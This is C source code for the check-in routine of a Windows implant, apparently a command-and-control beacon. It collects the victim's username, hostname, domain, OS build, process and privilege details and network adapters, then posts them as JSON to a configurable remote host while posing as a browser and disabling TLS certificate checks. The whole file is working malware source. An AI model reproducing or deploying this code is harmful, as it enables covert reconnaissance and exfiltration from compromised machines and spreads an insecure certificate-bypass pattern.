#include <beacon.h>
#include <stdio.h>

static void wchar_to_utf8(const wchar_t *src, char *dst, int dst_size) {
    WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dst_size, NULL, NULL);
}

static void tls_ignore(HINTERNET hReq) {
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA    |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
}

void beacon_checkin(BEACON_CTX *ctx) {
    char os_ver[128], arch[16], proc_name[260], uname[256], hname[256], dom[256];
    wchar_to_utf8(ctx->os_version,   os_ver,    sizeof(os_ver));
    wchar_to_utf8(ctx->arch,         arch,      sizeof(arch));
    wchar_to_utf8(ctx->process_name, proc_name, sizeof(proc_name));
    wchar_to_utf8(ctx->username,     uname,     sizeof(uname));
    wchar_to_utf8(ctx->hostname,     hname,     sizeof(hname));
    wchar_to_utf8(ctx->domain,       dom,       sizeof(dom));

    const char *adapters = ctx->adapters ? ctx->adapters : "[]";
    char json[8192];
    snprintf(json, sizeof(json),
        "{\"beacon_id\":%lu,\"sleep_ms\":%lu,\"jitter_pct\":%lu,"
        "\"eip\":\"%s\",\"adapters\":%s,"
        "\"os_version\":\"%s\",\"os_build\":%lu,\"arch\":\"%s\","
        "\"process_name\":\"%s\",\"pid\":%lu,\"ppid\":%lu,"
        "\"is_64bit_proc\":%s,\"integrity_level\":%lu,\"is_elevated\":%s,"
        "\"username\":\"%s\",\"hostname\":\"%s\",\"domain\":\"%s\","
        "\"is_domain_joined\":%s,\"session_id\":%lu}",
        ctx->beacon_id, ctx->sleep_ms, ctx->jitter_pct,
        ctx->eip, adapters,
        os_ver, ctx->os_build, arch,
        proc_name, ctx->pid, ctx->ppid,
        ctx->is_64bit_proc    ? "true" : "false",
        ctx->integrity_level,
        ctx->is_elevated      ? "true" : "false",
        uname, hname, dom,
        ctx->is_domain_joined ? "true" : "false",
        ctx->session_id);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, ctx->host, ctx->port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/checkin",
                                             NULL, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                                             WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    tls_ignore(hRequest);

    DWORD json_len = (DWORD)strlen(json);
    WinHttpSendRequest(hRequest, L"Content-Type: application/json\r\n",
                       (DWORD)-1L, json, json_len, json_len, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}
